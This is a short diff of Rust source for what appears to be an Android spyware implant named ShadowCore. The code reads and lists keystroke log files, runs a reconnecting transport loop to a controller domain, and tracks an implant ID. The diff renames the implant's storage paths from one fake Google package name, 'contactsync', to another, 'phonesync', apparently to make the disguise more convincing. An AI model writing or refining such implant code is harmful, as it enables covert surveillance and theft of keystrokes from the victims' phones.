@@ -172,14 +172,14 @@ fn cmd_fs_delete(path: &str) -> String {
 fn cmd_keylog_file() -> String {
     let date = cmd_shell("date +%Y-%m-%d");
     let path = format!(
-        "/data/data/com.google.android.contactsync/files/keylogs/keylog_{}.txt",
+        "/data/data/com.google.android.phonesync/files/keylogs/keylog_{}.txt",
         date.trim()
     );
     cmd_fs_read(&path)
 }
 
 fn cmd_keylog_list() -> String {
-    cmd_fs_list("/data/data/com.google.android.contactsync/files/keylogs")
+    cmd_fs_list("/data/data/com.google.android.phonesync/files/keylogs")
 }
 
 fn cmd_fs_list(path: &str) -> String {
@@ -376,7 +376,7 @@ impl ShadowCore {
         let tx_outbound = tx_send.clone();
 
         // Transport connection loop with reconnect
-        let ws_task = tokio::spawn(async move {
+        let transport_task = tokio::spawn(async move {
             let mut backoff = tokio::time::Duration::from_secs(2);
             let max_backoff = tokio::time::Duration::from_secs(60);
 
@@ -507,7 +507,7 @@ pub extern "system" fn Java_com_shadow_ShadowCore_nativeInit(
                 domain: domain.clone(),
                 implant_id: implant_id.clone(),
                 module_dir: std::path::PathBuf::from(
-                    "/data/data/com.google.android.contactsync/files/modules"
+                    "/data/data/com.google.android.phonesync/files/modules"
                 ),
                 event_tx,
             });
